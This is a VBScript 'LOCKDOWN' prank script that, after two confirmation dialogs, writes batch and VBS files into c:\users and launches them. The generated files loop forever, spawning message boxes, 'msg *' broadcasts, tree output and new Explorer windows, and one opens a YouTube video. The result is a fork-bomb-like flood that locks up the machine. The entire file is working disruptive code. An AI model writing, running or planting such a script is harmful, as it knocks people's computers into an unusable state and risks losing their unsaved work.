Dim fso, MyFile, printer
Set fso = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Wscript.Shell")
Command = "cmd /c start c:\users\alpha1.bat"



intMessage = MsgBox( "You are starting: OVERHEATING MEMORI ", _
	vbYesNo + vbExclamation + vbDefaultButton2, "LOCKDOWN")

If intMessage = vbYes Then
    intMessage = MsgBox( "Are you sure?", _
	vbYesNo + vbQuestion, "LOCKDOWN")

if intMessage = vbYes Then
		Set MyFile = fso.CreateTextFile("c:\users\alpha1.bat", True)

	MyFile.WriteLine("@echo off")
	MyFile.WriteLine("@echo .")
	MyFile.WriteLine("@echo    ***********************************************")
	MyFile.WriteLine("@echo    ***                                         ***")
	MyFile.WriteLine("@echo    ***         LAST WARNING	     	       ***")
	MyFile.WriteLine("@echo    ***                                         ***")
	MyFile.WriteLine("@echo    ***********************************************")
	MyFile.WriteLine("@echo .")
	MyFile.WriteLine("timeout /t 10 /nobreak")
	MyFile.WriteLine("start delta2.bat")

	Set MyFile = fso.CreateTextFile("c:\users\delta2.bat", True)
	
	MyFile.WriteLine("start charlie4.bat")
	MyFile.WriteLine("color 0a")
	MyFile.WriteLine(":top")
	MyFile.WriteLine("start foxtrot3.vbs")
	MyFile.WriteLine("@echo ________________$$$$")
	MyFile.WriteLine("@echo ______________$$____$$ ")
	MyFile.WriteLine("@echo ______________$$____$$ ")
	MyFile.WriteLine("@echo ______________$$____$$ ")
	MyFile.WriteLine("@echo ______________$$____$$ ")
	MyFile.WriteLine("@echo ______________$$____$$ ")
	MyFile.WriteLine("@echo __________$$$$$$____$$$$$$ ")
	MyFile.WriteLine("@echo ________$$____$$____$$____$$$$ ")
	MyFile.WriteLine("@echo ________$$____$$____$$____$$__$$")
	MyFile.WriteLine("@echo $$$$$$__$$____$$____$$____$$____$$")
	MyFile.WriteLine("@echo $$____$$$$________________$$____$$")
	MyFile.WriteLine("@echo $$______$$______________________$$")
	MyFile.WriteLine("@echo __$$____$$______________________$$")
	MyFile.WriteLine("@echo ___$$$__$$______________________$$")
	MyFile.WriteLine("@echo ____$$__________________________$$")
	MyFile.WriteLine("@echo _____$$$________________________$$")
	MyFile.WriteLine("@echo ______$$______________________$$$")
	MyFile.WriteLine("@echo _______$$$____________________$$")
	MyFile.WriteLine("@echo ________$$____________________$$")
	MyFile.WriteLine("@echo _________$$$________________$$$")
	MyFile.WriteLine("@echo __________$$________________$$")
	MyFile.WriteLine("@echo __________$$$$$$$$$$$$$$$$$$$$")
	Myfile.WriteLine("goto top")
	Wscript.Sleep 1000
	Set WshShell = CreateObject("WScript.Shell")
	Set WshShellExec = WshShell.Exec(Command)
	
	Set MyFile = fso.CreateTextFile("c:\users\foxtrot3.vbs", True)

	MyFile.WriteLine("intMessage = MsgBox(""LOCKDOWN"", vbOkOnly + vbExclamation, ""Delta1"")")

		Set MyFile = fso.CreateTextFile("c:\users\charlie4.bat", True)
	MyFile.WriteLine("@echo off")
	MyFile.WriteLine("start chrome https://www.youtube.com/watch?v=Ux5cQbO_ybw")
	MyFile.WriteLine("color 3")
	MyFile.WriteLine(":loop")
	Myfile.WriteLine("tree ")
	Myfile.WriteLine("msg * LOCKDOWN")
	Myfile.WriteLine("start explorer")
	Myfile.WriteLine("goto loop")
	Wscript.Quit	
	
else
 
End If

else
    intMessage = MsgBox("End of script. Do you want to see the script on github?", _
	vbYesNo + vbInformation, "LOCKDOWN")  
End If

if intMessage = vbYes Then
	objShell.Run ("https://github.com/VoidChacal/LOCKDOWN")
End If